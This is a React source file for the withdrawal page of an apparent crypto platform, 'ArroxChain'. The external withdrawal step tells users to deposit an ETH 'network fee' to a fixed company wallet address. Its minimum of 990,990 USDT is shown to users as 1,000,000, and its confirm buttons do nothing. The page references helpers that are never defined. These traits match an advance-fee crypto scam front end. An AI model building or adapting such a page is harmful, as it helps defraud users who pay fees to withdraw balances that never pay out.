// WithdrawPage.jsx

"use client";

import { useEffect, useState } from "react";
import NavHeader from "../components/NavHeader/NavHeader";
import { Card } from "@/components/ui/card";
import { Send, Zap } from "lucide-react";
import { toast } from 'sonner';


/* -------------------------------------------------- */
/* CONSTANTS */
/* -------------------------------------------------- */

const ETH_FEE_PER_MILLION_USDT = 0.25;
const MIN_WITHDRAW_USDT = 990_990;
const COMPANY_WALLET = "0x0688353c8f46299781e1a33ade320e25983d2402";

/* -------------------------------------------------- */
/* WITHDRAW TYPE SELECTOR */
/* -------------------------------------------------- */

function WithdrawalTypeSelector({ withdrawalType, setWithdrawalType }) {
  return (
    <div className="grid grid-cols-2 gap-4">
      <button
        onClick={() => setWithdrawalType("external")}
        className={`p-6 rounded-2xl border-2 transition ${withdrawalType === "external"
          ? "border-blue-500 bg-blue-500/10"
          : "border-border hover:border-blue-500/50"
          }`}
      >
        <div className="flex flex-col items-center gap-3">
          <Send className="w-8 h-8 text-blue-600" />
          <h3 className="font-semibold">External Withdraw</h3>
          <p className="text-xs text-muted-foreground text-center">
            Withdraw to external wallet
          </p>
        </div>
      </button>

      <button
        onClick={() => setWithdrawalType("internal")}
        className={`p-6 rounded-2xl border-2 transition ${withdrawalType === "internal"
          ? "border-emerald-500 bg-emerald-500/10"
          : "border-border hover:border-emerald-500/50"
          }`}
      >
        <div className="flex flex-col items-center gap-3">
          <Zap className="w-8 h-8 text-emerald-600" />
          <h3 className="font-semibold">Internal Transfer</h3>
          <p className="text-xs text-muted-foreground text-center">
            Transfer using ArroxChain WalletID
          </p>
        </div>
      </button>
    </div>
  );
}


/* -------------------------------------------------- */
/* EXTERNAL WITHDRAW */
/* -------------------------------------------------- */

function ExternalWithdrawal({ selectedAsset }) {
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState("");
  const [walletAddress, setWalletAddress] = useState("");

  const amountNumber = Number(amount || 0);
  const withdrawalMillions = amountNumber / 1_000_000;

  const networkFeeEth =
    withdrawalMillions > 0
      ? withdrawalMillions * ETH_FEE_PER_MILLION_USDT
      : 0;

  const insufficientMinimum =
    amountNumber > 0 && amountNumber < MIN_WITHDRAW_USDT;

  if (!selectedAsset) {
    return (
      <p className="text-sm text-muted-foreground">
        Please select an asset first.
      </p>
    );
  }

  return (
    <div className="space-y-6">

      {/* STEP INDICATOR */}

      <div className="flex justify-between text-xs font-medium">
        <span className={step === 1 ? "text-blue-600" : "text-muted-foreground"}>
          1. Withdrawal Details
        </span>
        <span className={step === 2 ? "text-blue-600" : "text-muted-foreground"}>
          2. Confirm Withdrawal
        </span>
      </div>

      {/* STEP 1 */}

      {step === 1 && (
        <div className="space-y-5">

          <div>
            <p className="text-sm text-muted-foreground mb-2">
              External Wallet Address
            </p>

            <input
              value={walletAddress}
              onChange={(e) =>
                setWalletAddress(e.target.value.slice(0, 42))
              }
              placeholder="0x..."
              className="w-full p-3 rounded-xl border bg-background"
            />
          </div>

          <div>
            <p className="text-sm text-muted-foreground mb-2">
              Withdrawal Amount ({selectedAsset.symbol})
            </p>

            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter amount"
              className="w-full p-3 rounded-xl border bg-background"
            />
          </div>

          <div className="text-xs text-muted-foreground space-y-1 border rounded-xl p-3 bg-muted/20">
            <p>Estimated Network Fee: {networkFeeEth.toFixed(4)} ETH</p>

            {insufficientMinimum && (
              <p className="text-yellow-500">
                Minimum withdrawal is 1,000,000 USDT
              </p>
            )}
          </div>

          <div className="flex justify-end">
            <button
              disabled={
                !walletAddress ||
                amountNumber <= 0 ||
                insufficientMinimum
              }
              onClick={() => setStep(2)}
              className="px-6 py-2 bg-blue-600 text-white rounded-xl disabled:opacity-50"
            >
              Continue
            </button>
          </div>

        </div>
      )}

      {/* STEP 2 */}

      {step === 2 && (
        <div className="space-y-5">

          <div className="p-4 rounded-xl border bg-muted/20 text-sm space-y-3">

            <div className="flex justify-between">
              <span>Asset</span>
              <span>{selectedAsset.symbol}</span>
            </div>

            <div className="flex justify-between">
              <span>Amount</span>
              <span>{amount}</span>
            </div>

            <div className="flex justify-between">
              <span>Network Fee</span>
              <span>{networkFeeEth.toFixed(4)} ETH</span>
            </div>

            <div className="flex justify-between">
              <span>Wallet</span>
              <span className="text-xs">{walletAddress.slice(0, 10)}...</span>
            </div>

          </div>

          <div className="border rounded-xl p-3 text-xs bg-yellow-500/10">
            Network fee must be deposited to:
            <div className="mt-2 font-mono break-all">
              {COMPANY_WALLET}
            </div>
          </div>

          <div className="flex justify-between">

            <button
              onClick={() => setStep(1)}
              className="px-6 py-2 border rounded-xl"
            >
              Back
            </button>

            <button className="px-6 py-2 bg-blue-600 text-white rounded-xl">
              Confirm Withdrawal
            </button>

          </div>

        </div>
      )}

    </div>
  );
}

/* -------------------------------------------------- */
/* INTERNAL TRANSFER */
/* -------------------------------------------------- */

function InternalWithdrawal({ selectedAsset }) {
  const [step, setStep] = useState(1);
  const [walletId, setWalletId] = useState("");
  const [amount, setAmount] = useState("");

  const amountNumber = Number(amount || 0);

  if (!selectedAsset) {
    return (
      <p className="text-sm text-muted-foreground">
        Please select an asset first.
      </p>
    );
  }

  return (
    <div className="space-y-6">

      {/* STEP INDICATOR */}

      <div className="flex justify-between text-xs font-medium">
        <span className={step === 1 ? "text-emerald-600" : "text-muted-foreground"}>
          1. Transfer Details
        </span>
        <span className={step === 2 ? "text-emerald-600" : "text-muted-foreground"}>
          2. Confirm Transfer
        </span>
      </div>

      {/* STEP 1 */}

      {step === 1 && (
        <div className="space-y-5">

          <div>
            <p className="text-sm text-muted-foreground mb-2">
              ArroxChain WalletID
            </p>

            <input
              value={walletId}
              onChange={(e) =>
                setWalletId(e.target.value.toUpperCase())
              }
              placeholder="ARR-12345"
              className="w-full p-3 rounded-xl border bg-background"
            />
          </div>

          <div>
            <p className="text-sm text-muted-foreground mb-2">
              Transfer Amount ({selectedAsset.symbol})
            </p>

            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter amount"
              className="w-full p-3 rounded-xl border bg-background"
            />
          </div>

          <div className="flex justify-end">
            <button
              disabled={!walletId || amountNumber <= 0}
              onClick={() => setStep(2)}
              className="px-6 py-2 bg-emerald-600 text-white rounded-xl disabled:opacity-50"
            >
              Continue
            </button>
          </div>

        </div>
      )}

      {/* STEP 2 */}

      {step === 2 && (
        <div className="space-y-5">

          <div className="p-4 rounded-xl border bg-emerald-500/10 text-sm space-y-3">

            <div className="flex justify-between">
              <span>Recipient</span>
              <span>{walletId}</span>
            </div>

            <div className="flex justify-between">
              <span>Asset</span>
              <span>{selectedAsset.symbol}</span>
            </div>

            <div className="flex justify-between">
              <span>Amount</span>
              <span>{amount}</span>
            </div>

            <div className="flex justify-between">
              <span>Status</span>
              <span className="text-emerald-600 font-medium">
                Instant Transfer
              </span>
            </div>

          </div>

          <div className="flex justify-between">

            <button
              onClick={() => setStep(1)}
              className="px-6 py-2 border rounded-xl"
            >
              Back
            </button>

            <button className="px-6 py-2 bg-emerald-600 text-white rounded-xl">
              Confirm Transfer
            </button>

          </div>

        </div>
      )}

    </div>
  );
}

/* -------------------------------------------------- */
/* MAIN PAGE */
/* -------------------------------------------------- */

export default function WithdrawPage() {
  const [withdrawalType, setWithdrawalType] = useState("external");
  const [assets, setAssets] = useState([]);
  const [selectedAsset, setSelectedAsset] = useState(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    async function loadAssets() {
      try {
        const data = await getUserAssets();
        setAssets(data || []);
      } catch (err) {
        console.error("Failed to load assets:", err);
      } finally {
        setLoading(false);
      }
    }

    loadAssets();
  }, []);

  return (
    <div className="relative min-h-screen w-full mb-10">
      <NavHeader className="text-foreground" />

      <div className="flex flex-1 items-center justify-center px-2 sm:px-0 mb-8">
        <Card className="w-full max-w-3xl p-6 space-y-6">
          <h2 className="text-2xl font-bold">Withdraw Assets</h2>

          {loading ? (
            <p className="text-sm text-muted-foreground">Loading assets...</p>
          ) : (
            <>
              <AssetSelector
                assets={assets}
                selectedAsset={selectedAsset}
                setSelectedAsset={setSelectedAsset}
              />

              <WithdrawalTypeSelector
                withdrawalType={withdrawalType}
                setWithdrawalType={setWithdrawalType}
              />

              <div className="border-t pt-6">
                {withdrawalType === "external" ? (
                  <ExternalWithdrawal selectedAsset={selectedAsset} />
                ) : (
                  <InternalWithdrawal selectedAsset={selectedAsset} />
                )}
              </div>
            </>
          )}
        </Card>
      </div>
    </div>
  );
}